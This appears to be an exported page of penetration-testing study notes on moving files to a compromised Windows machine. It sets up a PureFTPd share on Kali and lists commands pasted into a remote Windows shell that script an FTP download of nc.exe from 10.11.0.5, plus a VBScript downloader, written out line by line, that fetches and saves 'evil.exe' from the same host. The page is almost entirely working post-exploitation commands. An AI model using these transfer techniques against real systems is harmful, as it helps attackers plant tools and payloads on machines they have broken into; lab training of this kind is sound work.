<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Start ftp server share</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Start ftp server share</h1><br/>Before any clients can connect to our FTP server, we first need to create a new user for<br />PureFTPd. The following Bash script will automate the user creation for us:<br />#!/bin/bash<br />groupadd ftpgroup<br />useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br />pure-pw useradd offsec -u ftpuser -d /ftphome<br />pure-pw mkdb<br />cd /etc/pure-ftpd/auth/<br />ln -s ../conf/PureDB 60pdb<br />mkdir -p /ftphome<br />chown -R ftpuser:ftpgroup /ftphome/<br />/etc/init.d/pure-ftpd restart<br />We then run the script and provide a password for the offsec when prompted:<br />root@kali:~# chmod 755 setup-ftp<br />root@kali:~# ./setup-ftp<br />Password:<br />Enter it again:<br />Restarting ftp server<br />With our FTP server configured, we can now paste the following commands into a<br />remote Windows shell and download files over FTP non-interactively.<br />C:\Users\offsec&gt;echo open 10.11.0.5 21&gt; ftp.txt<br />C:\Users\offsec&gt;echo USER offsec&gt;&gt; ftp.txt<br />C:\Users\offsec&gt;echo ftp&gt;&gt; ftp.txt<br />C:\Users\offsec&gt;echo bin &gt;&gt; ftp.txt<br />C:\Users\offsec&gt;echo GET nc.exe &gt;&gt; ftp.txt<br />C:\Users\offsec&gt;echo bye &gt;&gt; ftp.txt<br />C:\Users\offsec&gt;ftp -v -n -s:ftp.txt<br /><br /><br />wget script<br />echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br />echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br />echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br />echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br />echo Err.Clear &gt;&gt; wget.vbs<br />echo Set http = Nothing &gt;&gt; wget.vbs<br />echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs<br />echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs<br />echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs<br />echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs<br />echo http.Open "GET", strURL, False &gt;&gt; wget.vbs<br />echo http.Send &gt;&gt; wget.vbs<br />echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br />echo Set http = Nothing &gt;&gt; wget.vbs<br />echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs<br />echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br />echo strData = "" &gt;&gt; wget.vbs<br />echo strBuffer = "" &gt;&gt; wget.vbs<br />echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br />echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br />echo Next &gt;&gt; wget.vbs<br />echo ts.Close &gt;&gt; wget.vbs<br /><br />cscript wget.vbs <a href="http://10.11.0.5/evil.exe">http://10.11.0.5/evil.exe</a> evil.exe</div></body></html>